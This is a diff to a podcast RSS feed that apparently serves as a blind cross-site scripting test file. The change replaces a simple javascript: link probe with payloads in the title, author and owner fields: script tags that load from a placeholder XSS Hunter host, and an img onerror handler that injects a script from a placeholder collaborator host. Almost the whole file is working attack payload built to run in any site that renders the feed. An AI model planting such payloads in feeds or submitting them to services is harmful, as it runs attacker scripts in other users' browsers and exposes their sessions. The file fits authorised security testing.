@@ -1,24 +1,22 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <rss version="2.0" xmlns:itunes="http://www.itunes.apple.com/dtds/podcast-1.0.dtd">
   <channel>
-    <title>Test XSS Podcast</title>
-    <link>javascript:alert(document.domain)</link>
-    <description><![CDATA[A great podcast about testing]]></description>
+    <title><![CDATA["><script src=https://YOUR_XSS_HUNTER.xss.ht></script>]]></title>
+    <link>https://example.com</link>
+    <description><![CDATA["><img src=x onerror="var s=document.createElement('script');s.src='https://YOUR_COLLABORATOR.oastify.com/xss';document.head.appendChild(s);">]]></description>
     <language>en</language>
-    <itunes:author>Test Author</itunes:author>
+    <itunes:author><![CDATA["><script src=https://YOUR_XSS_HUNTER.xss.ht></script>]]></itunes:author>
     <itunes:owner>
-      <itunes:name>Test</itunes:name>
+      <itunes:name><![CDATA["><script src=https://YOUR_XSS_HUNTER.xss.ht></script>]]></itunes:name>
       <itunes:email>test@test.com</itunes:email>
     </itunes:owner>
     <itunes:explicit>no</itunes:explicit>
     <itunes:image href="https://via.placeholder.com/3000x3000.jpg"/>
     <itunes:category text="Technology"/>
-    <copyright>2024 Test</copyright>
     <item>
       <title>Episode 1</title>
-      <description><![CDATA[First episode]]></description>
       <enclosure url="https://example.com/ep1.mp3" type="audio/mpeg" length="10000000"/>
-      <guid>ep1-link-xss</guid>
+      <guid>ep1-blind</guid>
     </item>
   </channel>
 </rss>
